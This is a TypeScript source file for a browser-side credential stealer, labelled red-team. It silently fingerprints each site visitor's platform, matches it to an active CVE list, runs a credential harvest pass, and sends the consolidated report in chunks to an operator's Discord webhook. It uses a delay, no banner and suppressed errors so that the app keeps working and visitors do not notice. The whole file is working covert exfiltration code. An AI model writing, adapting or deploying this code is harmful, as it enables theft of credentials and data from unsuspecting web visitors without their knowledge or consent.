// steal_runner.ts — device-aware stealth harvest for visitors.
// No banner: detects the visitor platform, matches the active CVE registry
// against it, runs one credential extraction pass, and whispers a single
// consolidated report (or as few Discord-sized chunks as needed) to the
// operator webhook.

import { stealAll, formatReport, chunkReport } from './red-team/stealer';
import { p_evoke } from './p_sync';
import { Z_LIST } from './z_ref';
import type { ZE } from './z_ref';

const HARVEST_DELAY_MS = 600;
const DISCORD_USERNAME = 'RedTeam-Stealer';

type Platform = 'ios' | 'android' | 'macos' | 'windows' | 'other';

function detectPlatform(ua: string, touch: boolean): Platform {
  if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
  if (/Macintosh/i.test(ua)) return touch ? 'ios' : 'macos';
  if (/Android/i.test(ua)) return 'android';
  if (/Windows/i.test(ua)) return 'windows';
  return 'other';
}

/** Active CVEs that plausibly apply: the visitor's platform, plus any
    platform-agnostic ('browser') entry. Deduplicated by CVE id. */
function matchCves(platform: Platform): ZE[] {
  const seen = new Set<string>();
  const out: ZE[] = [];
  for (const z of Z_LIST) {
    if (!z.is_active || seen.has(z.id)) continue;
    if (z.platform === 'browser' || z.platform === platform) {
      seen.add(z.id);
      out.push(z);
    }
  }
  return out;
}

let fired = false;

/** Fire-and-forget: never blocks or breaks the app. StrictMode-safe. */
export function runSteal(): void {
  if (fired) return;
  fired = true;
  setTimeout(() => {
    const ua = navigator.userAgent || '';
    const cves = matchCves(detectPlatform(ua, 'ontouchend' in window));
    void stealAll()
      .then(async (report) => {
        report.cves = cves.map(z => ({ id: z.id, payload: z.payload ?? 'basic' }));
        const chunks = chunkReport(formatReport(report));
        await Promise.allSettled(
          chunks.map(ch => p_evoke({ content: ch, username: DISCORD_USERNAME })),
        );
      })
      .catch(() => {/* harvest is non-critical; UI keeps working */});
  }, HARVEST_DELAY_MS);
}
